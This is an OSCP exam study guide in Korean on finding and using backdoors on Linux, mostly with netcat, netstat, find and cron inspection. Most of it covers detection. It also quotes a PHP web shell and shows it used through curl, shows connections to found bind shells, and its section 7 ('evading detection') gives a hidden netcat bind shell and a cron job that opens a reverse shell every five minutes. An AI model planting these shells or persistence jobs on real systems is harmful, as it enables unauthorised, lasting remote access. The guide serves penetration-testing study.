# 🚪 백도어 탐지 및 활용 가이드

백도어는 일반적인 인증 메커니즘을 우회하여 시스템에 접근할 수 있게 해주는 방법입니다. OSCP 시험에서는 이러한 백도어를 발견하고 활용하는 능력이 중요합니다. 이 문서에서는 주로 `netcat`을 이용한 백도어 탐지 및 활용 방법을 다룹니다.

## 1. 네트워크 연결 및 백도어 탐지

### 🔍 열린 포트 및 수상한 연결 확인

```bash
# 모든 활성 연결과 리스닝 포트 확인
netstat -antup

# 확립된 연결 확인
netstat -antp | grep ESTABLISHED

# 특정 프로세스에 연결된 포트 확인 (PID가 1234인 경우)
netstat -antp | grep 1234
```

### 🔍 특이한 리스닝 포트 식별

```bash
# 표준 포트가 아닌 리스닝 포트 확인
netstat -tunlp | grep -v -E "^(tcp6|udp6)"

# 일반적이지 않은 포트 범위 확인 (예: > 10000)
netstat -tunlp | grep -v -E "^(tcp6|udp6)" | grep -E ':1[0-9]{4}'
```

## 2. 파일 시스템에서 백도어 흔적 찾기

### 🔍 수상한 실행 파일 검색

```bash
# SUID 설정된 파일 검색 (권한 상승용 백도어일 수 있음)
find / -perm -4000 -type f 2>/dev/null

# 최근에 생성되거나 수정된 파일 검색
find / -type f -mtime -7 -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null

# 숨겨진 파일 및 디렉토리 검색
find / -name ".*" -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
```

### 🔍 웹 서버 관련 백도어 검색

```bash
# 웹 디렉토리에서 PHP 백도어 검색
find /var/www/ -name "*.php" -type f -exec grep -l "system(" {} \; 2>/dev/null
find /var/www/ -name "*.php" -type f -exec grep -l "eval(" {} \; 2>/dev/null
find /var/www/ -name "*.php" -type f -exec grep -l "base64_decode(" {} \; 2>/dev/null
```

## 3. 시스템 프로세스 검사

### 🔍 수상한 프로세스 확인

```bash
# 사용자 프로세스 확인
ps aux | grep -v "root\|daemon\|bin"

# 부모 프로세스가 없는 프로세스 찾기 (PID 1 제외)
ps aux | awk '$3 == 1 && $2 != 1 {print}'
```

### 🔍 cron 작업 검사

```bash
# 시스템 전체 cron 작업 확인
ls -la /etc/cron*

# 사용자별 cron 작업 확인
ls -la /var/spool/cron/crontabs/

# cron 작업 내용 확인
cat /etc/crontab
```

## 4. Netcat을 이용한 백도어 탐지 및 테스트

### 🔍 특정 포트 연결성 확인

```bash
# 특정 포트로 연결 테스트 (예: 포트 4444)
nc -nvz 10.10.10.10 4444

# 범위 포트 스캔 (예: 4000-5000)
nc -nvz 10.10.10.10 4000-5000
```

### 🔍 배너 그래빙으로 서비스 식별

```bash
# 특정 포트에서 실행 중인 서비스 확인
echo "" | nc -nv 10.10.10.10 4444
```

## 5. 발견된 백도어 연결 및 활용

### 🔍 기존 백도어 연결 시도

```bash
# 단순 연결 시도
nc 10.10.10.10 4444

# 대화형 세션 유지
nc -vn 10.10.10.10 4444
```

### 🔍 백도어 쉘에 연결

```bash
# 기존 netcat 백도어에 연결
nc 10.10.10.10 4444

# 연결 후 명령어 실행 테스트
whoami
id
```

## 6. 실제 시나리오 예시

### 🔍 시나리오 1: 웹 서버 백도어 발견

1. 웹 서버에서 수상한 PHP 파일 발견:

```bash
find /var/www/ -type f -name "*.php" -mtime -2 | xargs cat | grep -i "backdoor\|shell\|system"
```

2. 발견된 파일 분석 (`c99.php`):

```bash
cat /var/www/html/images/c99.php
# 내용 중에 백도어 코드 확인: <?php system($_GET['cmd']); ?>
```

3. 백도어 접근 테스트:

```bash
curl "http://10.10.10.10/images/c99.php?cmd=whoami"
```

### 🔍 시나리오 2: Netcat 리스너 백도어 발견

1. 수상한 프로세스 발견:

```bash
ps aux | grep nc
# 발견: /bin/nc -lvp 4444 -e /bin/bash
```

2. 연결 테스트:

```bash
nc 10.10.10.10 4444
whoami
id
```

3. 정보 수집 및 권한 상승:

```bash
# 백도어 쉘 내에서
uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null
```

## 7. 백도어 탐지 피하기 (방어자 관점)

### 🔍 비표준 포트 사용

```bash
# 특이한(흔하지 않은) 포트 번호 사용
nc -lvp 58742 -e /bin/bash
```

### 🔍 간헐적 연결 백도어 설정

```bash
# cron을 사용한 간헐적 백도어 (5분마다 외부로 연결 시도)
echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/443 0>&1'" > /tmp/cronjob
crontab /tmp/cronjob
```

## 8. 백도어 탐지를 위한 체크리스트

- [ ] 네트워크 연결 검사 (`netstat -antup`)
- [ ] 비정상적인 리스닝 포트 확인
- [ ] SUID/SGID 파일 점검
- [ ] 웹 디렉토리의 수상한 파일 확인
- [ ] 사용자 프로세스 검사
- [ ] Cron 작업 검토
- [ ] 최근 생성/수정된 파일 확인

## 💡 참고 사항

1. OSCP 시험에서는 자동화된 도구 사용이 제한될 수 있으므로, 수동 분석 기법을 숙지하는 것이 중요합니다.
2. 백도어 탐지 후에는 해당 백도어가 어떻게 설치되었는지 역추적하여 초기 침투 경로를 파악하는 것이 좋습니다.
3. 시스템 로그 파일(`/var/log/` 디렉토리)을 검사하여 백도어 설치와 관련된 활동을 확인할 수 있습니다.

---

## 🔗 OSCP 시험에서 사용 가능한 백도어 관련 명령어 치트 시트

| 목적             | 명령어                                                               |
| ---------------- | -------------------------------------------------------------------- |
| 리스닝 포트 확인 | `netstat -tunlp`                                                     |
| 수상한 연결 확인 | `netstat -antp \| grep ESTABLISHED`                                  |
| SUID 파일 찾기   | `find / -perm -4000 -type f 2>/dev/null`                             |
| 웹 백도어 검색   | `find /var/www/ -type f -name "*.php" -exec grep -l "system(" {} \;` |
| 수상한 cron 확인 | `cat /etc/crontab`                                                   |
| 특정 포트 테스트 | `nc -nvz 10.10.10.10 4444`                                           |
| 백도어 연결      | `nc 10.10.10.10 4444`                                                |
